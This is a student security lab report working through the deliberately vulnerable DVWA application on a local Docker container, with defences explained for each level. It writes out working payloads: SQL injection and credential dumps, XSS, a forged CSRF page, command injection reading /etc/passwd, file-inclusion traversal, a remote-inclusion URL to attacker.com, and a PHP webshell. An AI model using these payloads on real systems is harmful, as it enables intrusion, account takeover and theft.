# 🛡️ DVWA Security Lab Report

> **Author:** [@inciasaleem-dev](https://github.com/inciasaleem-dev)  
> **Repository:** [github.com/inciasaleem-dev/dvwa-security-lab](https://github.com/inciasaleem-dev/dvwa-security-lab)  
> **Assignment:** Application Security Testing  
> **Tool:** Damn Vulnerable Web Application (DVWA) via Docker  
> ⚠️ *All testing was performed exclusively on a local, isolated Docker container. No external systems were targeted.*

---

## Table of Contents

1. [Environment Setup](#environment-setup)
2. [Docker Deployment](#docker-deployment)
3. [Vulnerability Testing](#vulnerability-testing)
   - [SQL Injection](#1-sql-injection)
   - [SQL Injection Blind](#2-sql-injection-blind)
   - [XSS Reflected](#3-xss-reflected)
   - [XSS Stored](#4-xss-stored)
   - [XSS DOM](#5-xss-dom)
   - [CSRF](#6-csrf-cross-site-request-forgery)
   - [Command Injection](#7-command-injection)
   - [File Inclusion](#8-file-inclusion)
   - [File Upload](#9-file-upload)
   - [Brute Force](#10-brute-force)
   - [Insecure CAPTCHA](#11-insecure-captcha)
4. [Docker Inspection](#docker-inspection)
5. [Security Analysis](#security-analysis)
6. [OWASP Top 10 Mapping](#owasp-top-10-mapping)
7. [Bonus Nginx HTTPS](#bonus-nginx-reverse-proxy--https)

---

## Environment Setup

| Component | Details |
|---|---|
| Host OS | Windows 11 |
| Docker Version | 24.x |
| DVWA Image | `vulnerables/web-dvwa` |
| Container Name | `dvwa` |
| Access URL | `http://localhost:8080` |
| Default Credentials | `admin` / `password` |

After starting the container, navigate to `http://localhost:8080/setup.php` and click **Create / Reset Database** to initialize MySQL. Then log in with `admin` / `password`. Security levels are changed via **DVWA Security** in the left sidebar.

---

## Docker Deployment

```bash
# Pull the DVWA Docker image
docker pull vulnerables/web-dvwa

# Run the container mapped to port 8080
docker run -d \
  --name dvwa \
  -p 8080:80 \
  vulnerables/web-dvwa

# Verify it is running
docker ps
```

**Expected output:**
```
CONTAINER ID   IMAGE                    COMMAND      CREATED        STATUS        PORTS                  NAMES
a1b2c3d4e5f6   vulnerables/web-dvwa    "/main.sh"   2 minutes ago  Up 2 minutes  0.0.0.0:8080->80/tcp   dvwa
```

📸 `screenshots/docker-ps.png`

---

## Vulnerability Testing

---

## 1. SQL Injection

**OWASP:** A03:2021 – Injection  
**Location:** DVWA → SQL Injection

SQL Injection occurs when user input is concatenated into a SQL query without sanitization, allowing an attacker to alter the query's logic and access or manipulate the database.

---

### 🔴 Security Level: Low

**Payload:**
```sql
1' OR '1'='1
```

**The query becomes:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```
Since `'1'='1'` is always true, every row in the `users` table is returned.

**UNION attack to dump credentials:**
```sql
1' UNION SELECT user, password FROM users#
```
Returns all usernames and MD5-hashed passwords.

📸 `screenshots/sqli-low.png`

**Why it worked:** No input validation. The `$id` variable is pasted directly into the query string:
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

---

### 🟡 Security Level: Medium

The input field is replaced with a dropdown. The backend applies `mysql_real_escape_string()`, but the SQL comparison is **numeric** — no quotes are used, so escaping has no effect.

**Bypass via Browser DevTools:**
1. Right-click the dropdown → **Inspect Element**
2. Change an `<option value="1">` to:
```sql
1 OR 1=1
```
3. Submit

**Resulting query:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1;
```

📸 `screenshots/sqli-medium.png`

**Why it worked:** `mysql_real_escape_string()` only prevents string-context injection. Numeric fields need no quotes, making escaping irrelevant.

---

### 🟢 Security Level: High

**Same payloads — result: no injection.**

📸 `screenshots/sqli-high.png`

**Why it failed:** PDO Prepared Statements are used:
```php
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```
The query structure is compiled before user data is inserted. The `:id` placeholder is bound as typed data — user input can never alter query logic.

---

## 2. SQL Injection (Blind)

**OWASP:** A03:2021 – Injection  
**Location:** DVWA → SQL Injection (Blind)

No data is returned directly. The attacker infers information from the application's true/false responses — a boolean side-channel.

---

### 🔴 Security Level: Low

**Boolean inference:**
```sql
1' AND 1=1#
```
*Response: "User ID exists in the database."* → TRUE

```sql
1' AND 1=2#
```
*Response: "User ID is MISSING from the database."* → FALSE

**Character-by-character extraction:**
```sql
1' AND SUBSTRING(user,1,1)='a'#
1' AND SUBSTRING(user,1,1)='b'#
```
Repeat across all positions to reconstruct usernames and passwords.

📸 `screenshots/sqli-blind-low.png`

---

### 🟡 Security Level: Medium

Intercept the POST request with **Burp Suite** and modify the `id` parameter:
```
id=1 AND 1=1
id=1 AND 1=2
```
Numeric injection bypasses `mysql_real_escape_string()`.

📸 `screenshots/sqli-blind-medium.png`

---

### 🟢 Security Level: High

PDO prepared statements — fully mitigated. No exploitable side-channel exists.

📸 `screenshots/sqli-blind-high.png`

---

## 3. XSS (Reflected)

**OWASP:** A03:2021 – Injection  
**Location:** DVWA → XSS (Reflected)

Reflected XSS occurs when user input is echoed back in the HTTP response without encoding, causing the browser to execute it as JavaScript.

---

### 🔴 Security Level: Low

**Payload:**
```html
<script>alert('XSS')</script>
```
**Result:** A JavaScript alert dialog appears.

📸 `screenshots/xss-reflected-low.png`

**Why it worked:**
```php
echo "Hello " . $_GET['name'];
```
Input is printed directly into HTML with no encoding.

---

### 🟡 Security Level: Medium

`<script>` tags are stripped. Bypass using an HTML event handler:
```html
<img src=x onerror="alert('XSS')">
```
The browser tries to load a nonexistent image, triggers `onerror`, and executes the script.

📸 `screenshots/xss-reflected-medium.png`

**Why it worked:** Incomplete blacklist — does not cover HTML event handler attributes.

---

### 🟢 Security Level: High

**Payload rendered as plain text — no execution.**

📸 `screenshots/xss-reflected-high.png`

**Why it failed:**
```php
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES);
```
`htmlspecialchars()` converts `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`. The browser displays them as text, never interprets them as HTML or JavaScript.

---

## 4. XSS (Stored)

**OWASP:** A03:2021 – Injection  
**Location:** DVWA → XSS (Stored)

Stored XSS persists in the database and executes for every user who loads the affected page — significantly more dangerous than reflected XSS.

---

### 🔴 Security Level: Low

**Payload (in the Message field):**
```html
<script>alert('Stored XSS')</script>
```
**Result:** Script is saved to the database. Every page load fires the alert for every visitor.

📸 `screenshots/xss-stored-low.png`

**Why it worked:** No sanitization on input or output. Raw string inserted into DB and rendered directly into page HTML.

---

### 🟡 Security Level: Medium

`<script>` is stripped before storage. Bypass:
```html
<img src=x onerror=alert('Stored XSS')>
```

📸 `screenshots/xss-stored-medium.png`

---

### 🟢 Security Level: High

`htmlspecialchars()` applied on input and output. Payload stored and rendered as escaped literal text.

📸 `screenshots/xss-stored-high.png`

---

## 5. XSS (DOM)

**OWASP:** A03:2021 – Injection  
**Location:** DVWA → XSS (DOM)

DOM XSS lives entirely in client-side JavaScript. The page's own JS reads attacker-controlled URL data and writes it to the DOM unsafely — the server never sees the payload.

---

### 🔴 Security Level: Low

**URL payload:**
```
http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
```
The JavaScript reads `location.search`, parses `default`, and writes it via `innerHTML` — executing the script.

📸 `screenshots/xss-dom-low.png`

---

### 🟡 Security Level: Medium

The server filters the `default` query parameter. The **URL fragment (`#`)** is never sent to the server — only processed by the browser:
```
http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=English#<script>alert('XSS')</script>
```

📸 `screenshots/xss-dom-medium.png`

**Why it worked:** Server-side filtering is blind to the URL fragment.

---

### 🟢 Security Level: High

A server-side whitelist only permits `English`, `French`, `Spanish`, `German`. All other values are rejected.

📸 `screenshots/xss-dom-high.png`

---

## 6. CSRF (Cross-Site Request Forgery)

**OWASP:** A01:2021 – Broken Access Control  
**Location:** DVWA → CSRF

CSRF tricks an authenticated user's browser into sending a forged request to a trusted site, performing actions without the user's knowledge.

---

### 🔴 Security Level: Low

**Forged attack page:**
```html
<!DOCTYPE html>
<html>
<body>
  <h1>You've won a prize!</h1>
  <img src="http://localhost:8080/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
</body>
</html>
```
Any logged-in DVWA user who opens this page has their password silently changed to `hacked`.

📸 `screenshots/csrf-low.png`

**Why it worked:** No CSRF token. The server only checks for a valid session cookie, which the browser sends automatically — including with cross-origin requests.

---

### 🟡 Security Level: Medium

The server checks the `Referer` header. Using **Burp Suite**, add to the forged request:
```
Referer: http://localhost:8080
```

📸 `screenshots/csrf-medium.png`

**Why it worked:** The `Referer` header is client-supplied and trivially spoofed with a proxy.

---

### 🟢 Security Level: High

The form contains a **CSRF token** — a cryptographically random, session-bound value:
```html
<input type="hidden" name="user_token" value="9f3c2a1b4e...">
```
The forged request cannot include a valid token — it is unknown to the attacker.

📸 `screenshots/csrf-high.png`

**Why it failed:** Unpredictable, session-bound, single-use token. Without it the server rejects the request.

---

## 7. Command Injection

**OWASP:** A03:2021 – Injection  
**Location:** DVWA → Command Injection

Command injection passes user input to a shell function, allowing additional OS commands to be appended and executed on the server.

---

### 🔴 Security Level: Low

**Payloads:**
```bash
127.0.0.1; ls
127.0.0.1 && cat /etc/passwd
127.0.0.1 | whoami
```
**Result:** Directory listings and file contents returned alongside the ping output.

📸 `screenshots/cmdi-low.png`

**Why it worked:**
```php
shell_exec('ping -c 4 ' . $_POST['ip']);
```
No escaping — the shell interprets `;`, `&&`, and `|` as command separators.

---

### 🟡 Security Level: Medium

`&&` and `;` are blacklisted. Bypass:
```bash
127.0.0.1 | ls
127.0.0.1 & whoami
```

📸 `screenshots/cmdi-medium.png`

**Why it worked:** `|` and `&` are not in the blacklist.

---

### 🟢 Security Level: High

All metacharacters stripped: `|`, `&`, `;`, `-`, `$`, `(`, `)`, `` ` ``, `||`, `&&`. Only a valid IP address passes.

📸 `screenshots/cmdi-high.png`

---

## 8. File Inclusion

**OWASP:** A01:2021 – Broken Access Control  
**Location:** DVWA → File Inclusion

File inclusion vulnerabilities allow an attacker to force the server to load and execute unintended files from the local filesystem (LFI) or a remote server (RFI).

---

### 🔴 Security Level: Low

**Local File Inclusion:**
```
http://localhost:8080/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```
**Result:** `/etc/passwd` contents displayed — all system user accounts exposed.

**Remote File Inclusion:**
```
http://localhost:8080/dvwa/vulnerabilities/fi/?page=http://attacker.com/shell.php
```

📸 `screenshots/fi-low.png`

**Why it worked:** `page` parameter passed directly to `include()` with no validation.

---

### 🟡 Security Level: Medium

`../` and `http://` are stripped. Bypass using path duplication:
```
....//....//....//etc/passwd
```
After stripping `../`, `....//` collapses to `../` — achieving the same traversal.

📸 `screenshots/fi-medium.png`

---

### 🟢 Security Level: High

Strict filename whitelist — only `file1.php`, `file2.php`, `file3.php` permitted.

📸 `screenshots/fi-high.png`

---

## 9. File Upload

**OWASP:** A04:2021 – Insecure Design  
**Location:** DVWA → File Upload

Unrestricted file upload allows an attacker to upload a PHP webshell and execute arbitrary commands on the server.

---

### 🔴 Security Level: Low

**Create webshell (`shell.php`):**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Upload via the DVWA form, then execute:
```
http://localhost:8080/dvwa/hackable/uploads/shell.php?cmd=whoami
http://localhost:8080/dvwa/hackable/uploads/shell.php?cmd=cat /etc/passwd
http://localhost:8080/dvwa/hackable/uploads/shell.php?cmd=ls /var/www/html
```
**Result:** Full remote code execution as `www-data`.

📸 `screenshots/upload-low.png`

**Why it worked:** No file type validation — any file accepted and stored in a web-accessible directory.

---

### 🟡 Security Level: Medium

Server checks the `Content-Type` header. Use **Burp Suite** to change:
```
Content-Type: application/x-php  →  Content-Type: image/jpeg
```
Keep the `.php` extension. Server trusts the client-supplied MIME type.

📸 `screenshots/upload-medium.png`

**Why it worked:** `Content-Type` is client-controlled and trivially spoofed.

---

### 🟢 Security Level: High

Server uses `getimagesize()` to verify genuine image content AND validates extension against a whitelist. `.php` files rejected regardless of MIME type.

📸 `screenshots/upload-high.png`

---

## 10. Brute Force

**OWASP:** A07:2021 – Identification and Authentication Failures  
**Location:** DVWA → Brute Force

Brute force attacks systematically try many passwords until the correct one is found.

---

### 🔴 Security Level: Low

**Tool:** Burp Suite Community Edition

1. Submit any login attempt on the Brute Force page
2. In Burp Suite → **Proxy → HTTP History** → find the login GET request
3. Right-click → **Send to Intruder**
4. In Positions tab: clear all, highlight the password value → **Add §**
5. In Payloads tab, add wordlist:
```
password
123456
admin
letmein
qwerty
password123
```
6. Start Attack → sort by **Length** — successful login returns a different response size

**Result:** Password `password` identified.

📸 `screenshots/bruteforce-low.png`

**Why it worked:** No rate limiting, no lockout, no CAPTCHA, no delay.

---

### 🟡 Security Level: Medium

A **2-second `sleep()`** added on each failed attempt. Attack still works — just slower.

📸 `screenshots/bruteforce-medium.png`

**Why it only partially mitigated:** Delay slows attacks but doesn't prevent them. A 1,000-entry wordlist takes ~33 minutes instead of seconds.

---

### 🟢 Security Level: High

A **CSRF token** is embedded in the login form and changes every request. Standard Burp Intruder cannot reuse a captured request — a fresh token must be extracted from each response first.

📸 `screenshots/bruteforce-high.png`

**Why it's significantly harder:** Token unpredictability combined with rate limiting makes automation complex, slow, and easily detected.

---

## 11. Insecure CAPTCHA

**OWASP:** A04:2021 – Insecure Design  
**Location:** DVWA → Insecure CAPTCHA

An insecure CAPTCHA trusts a client-supplied parameter to confirm challenge completion — trivially bypassed.

---

### 🔴 Security Level: Low

The password change is a two-step form. Step 2 trusts a `passed_captcha` POST parameter.

Using **Burp Suite**, replace the Step 1 request body with:
```
step=2&password_new=hacked&password_conf=hacked&Change=Change&passed_captcha=true
```
**Result:** Password changed without solving any CAPTCHA.

📸 `screenshots/captcha-low.png`

**Why it worked:** A boolean supplied by the attacker is trusted — no actual CAPTCHA validation occurs.

---

### 🟡 Security Level: Medium

Same `passed_captcha=true` bypass works at Medium as well.

📸 `screenshots/captcha-medium.png`

---

### 🟢 Security Level: High

Server validates CAPTCHA response directly with the **Google reCAPTCHA API** server-to-server. The `passed_captcha` parameter is ignored.

📸 `screenshots/captcha-high.png`

**Why it failed:** Validation is fully server-side and communicates with an external authority. Client-supplied parameters have no influence.

---

## Docker Inspection

### docker ps

```bash
docker ps
```

```
CONTAINER ID   IMAGE                  COMMAND      CREATED      STATUS      PORTS                  NAMES
a1b2c3d4e5f6   vulnerables/web-dvwa   "/main.sh"   1 hour ago   Up 1 hour   0.0.0.0:8080->80/tcp   dvwa
```

📸 `screenshots/docker-ps.png`

---

### docker inspect dvwa

```bash
docker inspect dvwa
```

Key fields:
```json
{
  "Id": "a1b2c3d4e5f6abc...",
  "Name": "/dvwa",
  "NetworkSettings": {
    "IPAddress": "172.17.0.2",
    "Ports": {
      "80/tcp": [{ "HostIp": "0.0.0.0", "HostPort": "8080" }]
    }
  },
  "Config": {
    "Image": "vulnerables/web-dvwa",
    "ExposedPorts": { "80/tcp": {} }
  },
  "Mounts": []
}
```

📸 `screenshots/docker-inspect.png`

---

### docker logs dvwa

```bash
docker logs dvwa
```

```
=> Starting Apache
=> Starting MySQL
=> Checking for database
=> Setting up DVWA database
=> Running
```

📸 `screenshots/docker-logs.png`

---

### Inside the Container

```bash
docker exec -it dvwa /bin/bash
ls /var/www/html
```

```
config      dvwa        favicon.ico  index.php  robots.txt
```

```bash
php --version       # PHP 7.4.x
mysql --version     # MySQL 5.7.x
apache2 -v          # Apache/2.4.x (Debian)
```

📸 `screenshots/docker-exec.png`

---

### Docker Environment Analysis

| Question | Answer |
|---|---|
| **Where are application files stored?** | `/var/www/html` — the Apache document root inside the container |
| **Backend technology** | PHP 7.4 + MySQL 5.7 + Apache 2.4 on Debian 10 |
| **How Docker isolates the environment** | Docker uses Linux **namespaces** (separate process tree, network, filesystem, users) and **cgroups** (CPU/memory limits). The container has its own private IP (`172.17.0.x`) and cannot access host files or processes directly. Port 8080 on the host is NAT-mapped to port 80 inside the container. The entire environment is sandboxed and disposable. |

---

## Security Analysis

### 1. Why does SQL Injection succeed at Low security?

User input is concatenated directly into the SQL query string:

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

The database engine receives a single merged string and parses it as SQL. It cannot distinguish between the developer's intended structure and the attacker's injected syntax — because there is **no separation between instruction and data**. Whatever the user types becomes part of the SQL command.

---

### 2. What control prevents it at High security?

**PDO Prepared Statements with parameterized queries:**

```php
$data = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
$data->bindParam(':id', $id, PDO::PARAM_INT);
$data->execute();
```

The database compiles the query structure **first**, before any user data is involved. The `:id` placeholder is bound as a typed integer. No matter what characters the user submits — single quotes, `OR`, `UNION` — they are passed as a data value, never interpreted as SQL syntax. This is the definitive defense against SQL injection.

---

### 3. Does HTTPS prevent these attacks? Why or why not?

**No. HTTPS does not prevent any of the vulnerabilities in this lab.**

HTTPS (TLS) provides encryption in transit, server authentication, and tamper detection. However, by the time an HTTPS request arrives at the server, TLS has fully decrypted it. The application then processes the raw plaintext payload — SQL injection strings, XSS scripts, CSRF requests — exactly as if it arrived over HTTP.

**HTTPS protects the channel. It does not protect the application.**

These vulnerabilities occur in the application logic — in PHP code that handles input and constructs queries. Fixing them requires parameterized queries, output encoding, CSRF tokens, and input validation — none of which HTTPS provides.

---

### 4. What risks exist if DVWA is deployed publicly?

| Risk | Impact |
|---|---|
| Full database compromise | All credentials, personal data stolen or deleted via SQLi |
| Remote Code Execution | File upload + file inclusion allow arbitrary OS command execution |
| Account takeover | Brute force with no lockout compromises all accounts in minutes |
| Malware distribution | Stored XSS injects malicious scripts served to every visitor |
| Credential exposure | MD5 hashes dumped via SQLi crackable in seconds with rainbow tables |
| Server as attack pivot | Compromised server attacks other internal hosts |
| Legal liability | Knowingly deploying a vulnerable app publicly violates data protection laws (GDPR, PDPA, etc.) |

**DVWA must never be internet-facing.** It is a deliberately broken application for isolated, local security education only.

---

## OWASP Top 10 Mapping

| Vulnerability | OWASP 2021 Category | Risk |
|---|---|---|
| SQL Injection | **A03** – Injection | Critical |
| SQL Injection (Blind) | **A03** – Injection | Critical |
| XSS Reflected | **A03** – Injection | High |
| XSS Stored | **A03** – Injection | Critical |
| XSS DOM | **A03** – Injection | High |
| CSRF | **A01** – Broken Access Control | High |
| Command Injection | **A03** – Injection | Critical |
| File Inclusion | **A01** – Broken Access Control | Critical |
| File Upload | **A04** – Insecure Design | Critical |
| Brute Force | **A07** – Identification & Authentication Failures | High |
| Insecure CAPTCHA | **A04** – Insecure Design | Medium |

---

## Bonus: Nginx Reverse Proxy + HTTPS

### Setup

**Step 1 — Generate a self-signed SSL certificate:**

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout dvwa.key \
  -out dvwa.crt \
  -subj "/C=PK/ST=Sindh/L=Karachi/O=SecurityLab/CN=localhost"
```

---

**Step 2 — Create `nginx.conf`:**

```nginx
server {
    listen 80;
    server_name localhost;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name localhost;

    ssl_certificate     /etc/nginx/certs/dvwa.crt;
    ssl_certificate_key /etc/nginx/certs/dvwa.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;

    location / {
        proxy_pass         http://dvwa:80;
        proxy_set_header   Host $host;
        proxy_set_header   X-Real-IP $remote_addr;
        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto $scheme;
    }
}
```

---

**Step 3 — Create `docker-compose.yml`:**

```yaml
version: '3'

services:
  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa
    networks:
      - dvwa-net

  nginx:
    image: nginx:alpine
    container_name: nginx-proxy
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/conf.d/default.conf
      - ./dvwa.crt:/etc/nginx/certs/dvwa.crt
      - ./dvwa.key:/etc/nginx/certs/dvwa.key
    depends_on:
      - dvwa
    networks:
      - dvwa-net

networks:
  dvwa-net:
    driver: bridge
```

---

**Step 4 — Launch:**

```bash
docker-compose up -d
docker ps
```

Access DVWA at `https://localhost` — accept the self-signed certificate warning in the browser.

📸 `screenshots/bonus-https-browser.png`  
📸 `screenshots/bonus-nginx-ps.png`

---

### HTTP vs HTTPS Traffic Comparison

Traffic captured using **Wireshark** on the loopback interface:

| Property | HTTP (port 8080) | HTTPS (port 443) |
|---|---|---|
| Encryption | None — full plaintext | TLS encrypted — unreadable |
| Login credentials in Wireshark | Fully visible (`username=admin&password=password`) | Encrypted binary — unreadable |
| Session cookies | Visible and stealable | Encrypted in transit |
| SQL injection payloads | Visible in packet capture | Encrypted |
| Certificate | None | Self-signed X.509 (RSA 2048-bit) |
| MITM vulnerability | Fully vulnerable | Protected |
| HTTP redirect | Direct access on port 8080 | Port 80 → 301 redirect → HTTPS 443 |
| Application vulnerabilities | Present | **Still present** — HTTPS does not fix them |

📸 `screenshots/bonus-wireshark-http.png`  
📸 `screenshots/bonus-wireshark-https.png`

---

### Conclusion

Placing DVWA behind HTTPS protects credentials and session cookies from network-level interception. However, it does **not fix any application vulnerability**. Once TLS decrypts the request on the server, the application still receives the raw payload — SQL injection strings, XSS scripts, and CSRF requests all function identically over HTTPS.

**Effective security requires both:**
1. **Secure transport** — HTTPS protects data in transit
2. **Secure application code** — prepared statements, output encoding, CSRF tokens, input validation

Neither alone is sufficient. Defense in depth means every layer is protected.

---

## Final Summary

| Security Level | Defense Quality | All Vulnerabilities |
|---|---|---|
| **Low** | None — raw input throughout | Fully exploitable |
| **Medium** | Partial — blacklists, basic filtering | Most bypassed with simple techniques |
| **High** | Proper — whitelists, prepared statements, tokens | Not exploitable with standard techniques |
